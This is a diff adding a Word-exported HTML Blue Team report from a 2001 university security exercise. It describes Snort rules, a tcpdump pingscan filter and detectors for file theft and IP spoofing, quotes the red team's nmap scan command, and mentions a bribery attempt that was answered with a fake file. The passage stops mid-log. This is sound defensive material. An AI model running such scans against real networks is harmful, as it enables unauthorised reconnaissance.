@@ -1,0 +1,1290 @@
+<html xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns="http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 9">
+<meta name=Originator content="Microsoft Word 9">
+<link rel=File-List href="./network_blueteam_files/filelist.xml">
+<title>· Blue Team Report</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>srsiva</o:Author>
+  <o:Template>Normal</o:Template>
+  <o:LastAuthor>Giovanni Vigna</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>183</o:TotalTime>
+  <o:LastPrinted>2001-03-14T02:02:00Z</o:LastPrinted>
+  <o:Created>2001-03-15T00:21:00Z</o:Created>
+  <o:LastSaved>2001-03-15T00:21:00Z</o:LastSaved>
+  <o:Pages>6</o:Pages>
+  <o:Words>1905</o:Words>
+  <o:Characters>10862</o:Characters>
+  <o:Company>COE, UCSB</o:Company>
+  <o:Lines>90</o:Lines>
+  <o:Paragraphs>21</o:Paragraphs>
+  <o:CharactersWithSpaces>13339</o:CharactersWithSpaces>
+  <o:Version>9.2720</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:DisplayHorizontalDrawingGridEvery>0</w:DisplayHorizontalDrawingGridEvery>
+  <w:DisplayVerticalDrawingGridEvery>0</w:DisplayVerticalDrawingGridEvery>
+  <w:UseMarginsForDrawingGridOrigin/>
+  <w:Compatibility>
+   <w:FootnoteLayoutLikeWW8/>
+   <w:ShapeLayoutLikeWW8/>
+   <w:AlignTablesRowByRow/>
+   <w:ForgetLastTabAlignment/>
+   <w:LayoutRawTableWidth/>
+   <w:LayoutTableRowsApart/>
+  </w:Compatibility>
+ </w:WordDocument>
+</xml><![endif]-->
+<style>
+<!--
+ /* Font Definitions */
+@font-face
+	{font-family:Complex;
+	mso-font-alt:"Courier New";
+	mso-font-charset:0;
+	mso-generic-font-family:auto;
+	mso-font-pitch:variable;
+	mso-font-signature:647 0 0 0 15 0;}
+ /* Style Definitions */
+p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+h1
+	{mso-style-next:Normal;
+	margin:0in;
+	margin-bottom:.0001pt;
+	text-align:justify;
+	mso-pagination:widow-orphan;
+	page-break-after:avoid;
+	mso-outline-level:1;
+	font-size:11.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-font-kerning:0pt;
+	mso-bidi-font-weight:normal;}
+p.MsoHeader, li.MsoHeader, div.MsoHeader
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	tab-stops:center 3.0in right 6.0in;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+p.MsoFooter, li.MsoFooter, div.MsoFooter
+	{margin:0in;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	tab-stops:center 3.0in right 6.0in;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+p.MsoTitle, li.MsoTitle, div.MsoTitle
+	{margin:0in;
+	margin-bottom:.0001pt;
+	text-align:center;
+	mso-pagination:widow-orphan;
+	font-size:18.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:Complex;
+	mso-fareast-font-family:"Times New Roman";
+	mso-bidi-font-family:"Times New Roman";
+	font-weight:bold;
+	mso-bidi-font-weight:normal;
+	text-decoration:underline;
+	text-underline:single;}
+p.MsoBodyText, li.MsoBodyText, div.MsoBodyText
+	{margin:0in;
+	margin-bottom:.0001pt;
+	text-align:justify;
+	mso-pagination:widow-orphan;
+	font-size:11.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+p.MsoBodyTextIndent, li.MsoBodyTextIndent, div.MsoBodyTextIndent
+	{margin-top:0in;
+	margin-right:0in;
+	margin-bottom:0in;
+	margin-left:76.5pt;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+p.MsoBodyTextIndent2, li.MsoBodyTextIndent2, div.MsoBodyTextIndent2
+	{margin-top:0in;
+	margin-right:0in;
+	margin-bottom:0in;
+	margin-left:1.0in;
+	margin-bottom:.0001pt;
+	text-align:justify;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	mso-bidi-font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;
+	text-underline:single;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:purple;
+	text-decoration:underline;
+	text-underline:single;}
+strong
+	{mso-bidi-font-weight:normal;}
+@page Section1
+	{size:8.5in 11.0in;
+	margin:1.0in 1.25in 1.0in 1.25in;
+	mso-header-margin:.5in;
+	mso-footer-margin:.5in;
+	mso-footer:url("./network_blueteam_files/header.htm") f1;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+ /* List Definitions */
+@list l0
+	{mso-list-id:40785580;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l0:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l1
+	{mso-list-id:126357393;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l1:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l2
+	{mso-list-id:230311929;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l2:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l3
+	{mso-list-id:344134807;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l3:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l4
+	{mso-list-id:512886406;
+	mso-list-type:simple;
+	mso-list-template-ids:80747648;}
+@list l4:level1
+	{mso-level-tab-stop:94.5pt;
+	mso-level-number-position:left;
+	margin-left:94.5pt;
+	text-indent:-.25in;}
+@list l5
+	{mso-list-id:660044818;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l5:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l6
+	{mso-list-id:912542507;
+	mso-list-type:simple;
+	mso-list-template-ids:80747648;}
+@list l6:level1
+	{mso-level-tab-stop:94.5pt;
+	mso-level-number-position:left;
+	margin-left:94.5pt;
+	text-indent:-.25in;}
+@list l7
+	{mso-list-id:971515489;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l7:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l8
+	{mso-list-id:1197961709;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l8:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l9
+	{mso-list-id:1366128618;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l9:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l10
+	{mso-list-id:1522283699;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l10:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l11
+	{mso-list-id:1610046376;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l11:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l12
+	{mso-list-id:1703894480;
+	mso-list-type:simple;
+	mso-list-template-ids:67698703;}
+@list l12:level1
+	{mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;}
+@list l13
+	{mso-list-id:1774745421;
+	mso-list-type:simple;
+	mso-list-template-ids:80747648;}
+@list l13:level1
+	{mso-level-tab-stop:94.5pt;
+	mso-level-number-position:left;
+	margin-left:94.5pt;
+	text-indent:-.25in;}
+@list l14
+	{mso-list-id:1819107973;
+	mso-list-type:simple;
+	mso-list-template-ids:67698703;}
+@list l14:level1
+	{mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;}
+@list l15
+	{mso-list-id:1849521121;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l15:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l16
+	{mso-list-id:1869950576;
+	mso-list-type:simple;
+	mso-list-template-ids:80747648;}
+@list l16:level1
+	{mso-level-tab-stop:94.5pt;
+	mso-level-number-position:left;
+	margin-left:94.5pt;
+	text-indent:-.25in;}
+@list l17
+	{mso-list-id:1921910301;
+	mso-list-type:simple;
+	mso-list-template-ids:67698689;}
+@list l17:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;
+	font-family:Symbol;}
+@list l18
+	{mso-list-id:2116515147;
+	mso-list-type:simple;
+	mso-list-template-ids:-1942431624;}
+@list l18:level1
+	{mso-level-text:"\[%1\]";
+	mso-level-tab-stop:.25in;
+	mso-level-number-position:left;
+	margin-left:.25in;
+	text-indent:-.25in;}
+ol
+	{margin-bottom:0in;}
+ul
+	{margin-bottom:0in;}
+-->
+</style>
+</head>
+
+<body lang=EN-US link=blue vlink=purple style='tab-interval:.5in'>
+
+<div class=Section1>
+
+<p class=MsoTitle>Blue Team Report</p>
+
+<p class=MsoNormal style='margin-left:1.0in;text-align:justify'><b
+style='mso-bidi-font-weight:normal'><i style='mso-bidi-font-style:normal'><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></i></b></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l0 level1 lfo1;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:16.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><b
+style='mso-bidi-font-weight:normal'><u><span style='font-size:16.0pt;
+mso-bidi-font-size:10.0pt'>Team/Subgroup<o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><u><span style='font-size:18.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><i style='mso-bidi-font-style:normal'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'>Group Name:</span></i></b><span style='font-size:
+12.0pt;mso-bidi-font-size:10.0pt'><span style='mso-tab-count:1'>            </span>Blue
+Team / Network Subgroup<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><i style='mso-bidi-font-style:normal'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'>Description of team activity</span></i></b><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>: The Network team is
+responsible for monitoring the network traffic during the war and producing
+meaningful reports.</span> </p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><i style='mso-bidi-font-style:normal'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'>Team Members, email and handles:</span></i></b><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><span style='mso-tab-count:
+1'>            </span>Sankaridurg Sivaguru (<a href="mailto:srsiva@cs.ucsb.edu"><span
+style='font-size:10.0pt'>srsiva@cs.ucsb.edu</span></a>, </span>borntohack<span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>), Ashwani Wason (<a
+href="mailto:ashwas@engineering.ucsb.edu"><span style='font-size:10.0pt'>ashwas@engineering.ucsb.edu</span></a>,
+ashes), Rune Satre (<a href="mailto:satre@cs.ucsb.edu)"><span style='font-size:
+10.0pt'>satre@cs.ucsb.edu</span></a>, rs), Ahmet Bulut (<a
+href="mailto:bulut@cs.ucsb.edu"><span style='font-size:10.0pt'>bulut@cs.ucsb.edu</span></a>,
+bulut007)<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoBodyTextIndent style='margin-left:0in;text-align:justify'><b
+style='mso-bidi-font-weight:normal'><i style='mso-bidi-font-style:normal'>Group
+Leader:</i></b><i style='mso-bidi-font-style:normal'> </i>Ashwani Wason.<u><span
+style='font-size:18.0pt;mso-bidi-font-size:10.0pt'><o:p></o:p></span></u></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><u><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l0 level1 lfo1;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:16.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><b
+style='mso-bidi-font-weight:normal'><u><span style='font-size:16.0pt;
+mso-bidi-font-size:10.0pt'>Mission<o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><u><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></b></p>
+
+<p class=MsoBodyTextIndent style='margin-left:0in;text-align:justify'><b
+style='mso-bidi-font-weight:normal'><i style='mso-bidi-font-style:normal'>Team
+responsibilities: </i></b>The Network team is responsible for monitoring the
+network traffic, during the war. The team will log all attacks that were sensed
+and produce reports that try to reconstruct the sequence of steps made by the
+red team. The network team will only log the attacks as they are sensed and
+will NOT do anything to filter traffic when such attacks are detected.</p>
+
+<p class=MsoBodyTextIndent style='margin-left:0in;text-align:justify'><b
+style='mso-bidi-font-weight:normal'><i style='mso-bidi-font-style:normal'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></i></b></p>
+
+<p class=MsoBodyTextIndent style='margin-left:0in;text-align:justify'><b
+style='mso-bidi-font-weight:normal'><i style='mso-bidi-font-style:normal'>Responsibilities
+of each group member:<o:p></o:p></i></b></p>
+
+<p class=MsoBodyTextIndent style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><i style='mso-bidi-font-style:normal'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></i></b></p>
+
+<p class=MsoBodyTextIndent style='margin-left:0in;text-align:justify'><b
+style='mso-bidi-font-weight:normal'><i style='mso-bidi-font-style:normal'>Ashwani</i></b>:
+Detecting portscans using snort rules; Detecting access to file secret.txt in
+incoming ftp, mail and outgoing ftp, telnet and mail packets using snort
+rules.Using Netstat IDS to write rules to do pattern matching on packet
+streams.Writing a program for detecting IP spoofing.</p>
+
+<p class=MsoBodyTextIndent style='text-align:justify'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoBodyTextIndent style='margin-left:0in;text-align:justify'><b
+style='mso-bidi-font-weight:normal'><i style='mso-bidi-font-style:normal'>Siva:
+</i></b>Writing snort rules for detecting pingscans. Using the tcpStream
+preprocessor in snort to write rules to detect file access to secret.txt in
+input telnet stream. Using identd to detect breach of trust relationships.</p>
+
+<p class=MsoBodyTextIndent style='text-align:justify'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></p>
+
+<p class=MsoBodyTextIndent style='margin-left:0in;text-align:justify'><b
+style='mso-bidi-font-weight:normal'><i style='mso-bidi-font-style:normal'>Rune:
+</i></b>Writing perl script to generate snort rules to detect used and unused
+service access. Detecting IP spoofing during the exercise. Looking for snort
+signatures for the latest attacks. I was contacted by members of the red team
+and bribed into sending them the secret file from the NT machine. Since the NT
+machine is not part of the game, I decided to send them a fake file. Just to
+keep them thrilled.</p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><u><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l0 level1 lfo1;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:16.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><b
+style='mso-bidi-font-weight:normal'><u><span style='font-size:16.0pt;
+mso-bidi-font-size:10.0pt'>Preparation<o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><u><span style='font-size:18.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><i style='mso-bidi-font-style:normal'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'>Planned activities:<span style='mso-tab-count:1'>            </span></span></i></b><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>Using tools and writing programs
+to: <o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'>Detect ping scans, Detect portscans, Detect
+IP-spoofing, Detect access to secret.txt in incoming and outgoing packet
+streams, Detect violation of trust relationships, Write scripts to create rules
+to detect use of used and unused services during the exercise, and Search and
+install latest signatures that address a number of attacks<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><u><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><i style='mso-bidi-font-style:normal'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'>Tools, methods and software: </span></i></b><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>The following tools,
+software and methods were adopted to achieve the above mentioned goals. The
+author of each of the detection methods listed below is mentioned inline.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l7 level1 lfo19;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><b style='mso-bidi-font-weight:normal'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Snort: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Snort rules were written to
+detect access to used and unused services, detect latest attacks, and access to
+secret.txt in “multi-byte” tcp and udp streams. <o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l7 level1 lfo19;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><b style='mso-bidi-font-weight:normal'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Tcpdump: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Tcpdump filter was written
+to detect Ping Scan by checking the number of ARP Requests generated by the
+router within a short span. <br>
+<b style='mso-bidi-font-weight:normal'>Libpcap: </b>Libpcap was used to write a
+tool to detect IP-spoofing by using domain specific knowledge about testbed
+network. Ashwani Wason developed this tool. <o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l7 level1 lfo19;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><b style='mso-bidi-font-weight:normal'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Tcpd, identd: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Tcpd and identd services
+were investigated for their uses in detecting breach of trust relationships. <o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l7 level1 lfo19;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><b style='mso-bidi-font-weight:normal'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Perl: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Perl scripts were used to
+automatically create rule sets for activity 6. Rune Satre implemented the perl
+scripts. <o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l7 level1 lfo19;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><b style='mso-bidi-font-weight:normal'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Netstat IDS: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Netstat IDS was used to do
+pattern matching on packet streams. <o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l7 level1 lfo19;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><b style='mso-bidi-font-weight:normal'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>TcpStream Preprocessor: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Stream pre-processor was
+used to detect potential access to secret.txt in incoming “byte-at-a-time” tcp
+streams. <o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l7 level1 lfo19;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><b style='mso-bidi-font-weight:normal'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>PortScan PreProcessor: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>The portscan pre-processor
+was used to detect UDP and TCP portscans<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l0 level1 lfo1;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:16.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><b
+style='mso-bidi-font-weight:normal'><u><span style='font-size:16.0pt;
+mso-bidi-font-size:10.0pt'>Execution<o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Siva and Ashwani were watching pingscans, portscans,
+file accesses and monitored network traffic to provide early warnings to host
+teams.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Rune and Bulut were detecting IP-spoofing attacks,
+access to used and unused services and looking through the snort logs to find
+attack patterns.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>What follows is a summary of the activities of the
+group during the war:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Pingscans: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>We were able to detect
+pingscans. A part of the log is attached below.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>The filter was: <b style='mso-bidi-font-weight:normal'><i
+style='mso-bidi-font-style:normal'>tcpdump \(icmp and dst host 128.111.54.255\)
+or arp|tee /log/pingscan.log</i></b><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>This is the pingscan done using nmap, as the IP
+addresses are increasing sequentially (nmap -sP &lt;network&gt;)<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>14:37:35.526768 arp who-has 128.111.54.105 tell
+csworld54.cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
